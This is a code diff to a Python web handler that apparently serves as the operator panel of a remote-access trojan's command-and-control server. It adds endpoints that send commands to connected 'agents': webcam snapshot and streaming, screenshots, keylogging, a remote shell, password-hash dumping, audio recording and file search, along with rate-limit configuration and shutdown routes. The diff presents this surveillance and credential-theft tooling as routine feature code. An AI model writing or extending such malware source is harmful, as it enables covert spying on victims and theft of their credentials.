@@ -52,6 +52,8 @@ class WebHandler(BaseHTTPRequestHandler):
             self._send_file(os.path.join(_templates_dir, "index.html"))
         elif self.path == "/api/agents":
             self._serve_agents()
+        elif self.path == "/api/stats":
+            self._serve_stats()
         elif self.path.startswith("/static/"):
             filepath = os.path.join(_static_dir, self.path[8:])
             self._send_file(filepath)
@@ -60,7 +62,8 @@ class WebHandler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         if self.path.startswith("/api/agents/"):
-            parts = self.path[12:].split("/")
+            path_part = self.path[12:].split("?")[0]
+            parts = path_part.split("/")
             if len(parts) >= 2:
                 agent_id = parts[0]
                 action = parts[1]
@@ -72,10 +75,39 @@ class WebHandler(BaseHTTPRequestHandler):
                     self._handle_download(agent_id)
                 elif action == "upload":
                     self._handle_upload(agent_id)
+                elif action == "webcam":
+                    if len(parts) >= 3:
+                        webcam_action = parts[2]
+                        if webcam_action == "snapshot":
+                            self._handle_webcam_snapshot(agent_id)
+                        elif webcam_action == "stream":
+                            self._handle_webcam_stream(agent_id)
+                        else:
+                            self._send_json({"success": False, "error": f"Unknown webcam action: {webcam_action}"}, 400)
+                    else:
+                        self._send_json({"success": False, "error": "Missing webcam action (snapshot or stream)"}, 400)
+                elif action == "screenshot":
+                    self._handle_generic_command(agent_id, "screenshot")
+                elif action == "keylogger":
+                    self._handle_generic_command(agent_id, "keylogger")
+                elif action == "shell":
+                    self._handle_generic_command(agent_id, "shell")
+                elif action == "hashdump":
+                    self._handle_generic_command(agent_id, "hashdump")
+                elif action == "ipconfig":
+                    self._handle_generic_command(agent_id, "ipconfig")
+                elif action == "record_audio":
+                    self._handle_generic_command(agent_id, "record_audio")
+                elif action == "search":
+                    self._handle_generic_command(agent_id, "search")
                 else:
-                    self._send_json({"success": False, "error": "Unknown action"}, 400)
+                    self._send_json({"success": False, "error": f"Unknown action: {action}"}, 400)
             else:
                 self._send_json({"success": False, "error": "Invalid path"}, 400)
+        elif self.path == "/api/configure":
+            self._handle_configure()
+        elif self.path == "/api/shutdown":
+            self._handle_shutdown()
         else:
             self.send_error(404)
 
@@ -172,6 +204,119 @@ class WebHandler(BaseHTTPRequestHandler):
                     "idle": session.idle_time,
                 })
         self._send_json({"agents": agents})
+
+    def _serve_stats(self):
+        if _server_instance is None:
+            self._send_json({"active": 0, "max": 0, "unique_ips": 0, "banned_count": 0})
+            return
+        stats = _server_instance._rate_limiter.get_stats()
+        with _server_instance.lock:
+            active = len(_server_instance.sessions)
+        self._send_json({
+            "active": active,
+            "max": stats["max_total_connections"],
+            "unique_ips": stats["unique_ips_connected"],
+            "banned_count": len(stats["banned_ips"]),
+        })
+
+    def _handle_configure(self):
+        if _server_instance is None:
+            self._send_json({"success": False, "error": "Server not ready"}, 500)
+            return
+        try:
+            data = self._read_json_body()
+            setting = data.get("setting")
+            value_str = data.get("value")
+            if not setting or not value_str:
+                self._send_json({"success": False, "error": "Missing setting or value"}, 400)
+                return
+            try:
+                value = int(value_str)
+            except ValueError:
+                self._send_json({"success": False, "error": "Value must be integer"}, 400)
+                return
+            if setting == "max_file_size_in_bytes":
+                if value <= 0:
+                    self._send_json({"success": False, "error": "Must be positive"}, 400)
+                    return
+                _server_instance.max_file_size = value
+            elif setting == "max_connections_per_ip_per_minute":
+                if value <= 0:
+                    self._send_json({"success": False, "error": "Must be positive"}, 400)
+                    return
+                _server_instance._rate_limiter.max_connections_per_ip_per_minute = value
+            elif setting == "max_concurrent_connections_per_ip":
+                if value <= 0:
+                    self._send_json({"success": False, "error": "Must be positive"}, 400)
+                    return
+                _server_instance._rate_limiter.max_concurrent_per_ip = value
+            elif setting == "max_total_connections":
+                if value <= 0:
+                    self._send_json({"success": False, "error": "Must be positive"}, 400)
+                    return
+                _server_instance._rate_limiter.max_total_connections = value
+            elif setting == "rate_limit_ban_seconds":
+                if value < 0:
+                    self._send_json({"success": False, "error": "Must be non-negative"}, 400)
+                    return
+                _server_instance._rate_limiter.ban_duration_seconds = value
+            else:
+                self._send_json({"success": False, "error": "Unknown setting"}, 400)
+                return
+            self._send_json({"success": True})
+        except Exception as e:
+            self._send_json({"success": False, "error": str(e)}, 500)
+
+    def _handle_shutdown(self):
+        self._send_json({"success": True})
+        _server_instance.running = False
+
+    def _handle_webcam_snapshot(self, agent_id: str):
+        if _server_instance is None:
+            self._send_json({"success": False, "error": "Server not ready"}, 500)
+            return
+        try:
+            data = self._read_json_body()
+            camera = data.get("camera", 0)
+            with _server_instance.lock:
+                if agent_id not in _server_instance.sessions:
+                    self._send_json({"success": False, "error": "Agent not found"}, 404)
+                    return
+            result = _server_instance.send_command_to_agent(agent_id, "webcam_snapshot", {"camera": camera})
+            self._send_json(result)
+        except Exception as e:
+            self._send_json({"success": False, "error": str(e)}, 500)
+
+    def _handle_webcam_stream(self, agent_id: str):
+        if _server_instance is None:
+            self._send_json({"success": False, "error": "Server not ready"}, 500)
+            return
+        try:
+            data = self._read_json_body()
+            action = data.get("action", "status")
+            with _server_instance.lock:
+                if agent_id not in _server_instance.sessions:
+                    self._send_json({"success": False, "error": "Agent not found"}, 404)
+                    return
+            result = _server_instance.send_command_to_agent(agent_id, "webcam_stream", data)
+            self._send_json(result)
+        except Exception as e:
+            self._send_json({"success": False, "error": str(e)}, 500)
+
+    def _handle_generic_command(self, agent_id: str, command: str):
+        if _server_instance is None:
+            self._send_json({"success": False, "error": "Server not ready"}, 500)
+            return
+        try:
+            data = self._read_json_body()
+            with _server_instance.lock:
+                if agent_id not in _server_instance.sessions:
+                    self._send_json({"success": False, "error": "Agent not found"}, 404)
+                    return
+            result = _server_instance.send_command_to_agent(agent_id, command, data)
+            self._send_json(result)
+        except Exception as e:
+            self._send_json({"success": False, "error": str(e)}, 500)
 
 
 def start_web_server(host: str, port: int, server: "Server") -> HTTPServer:
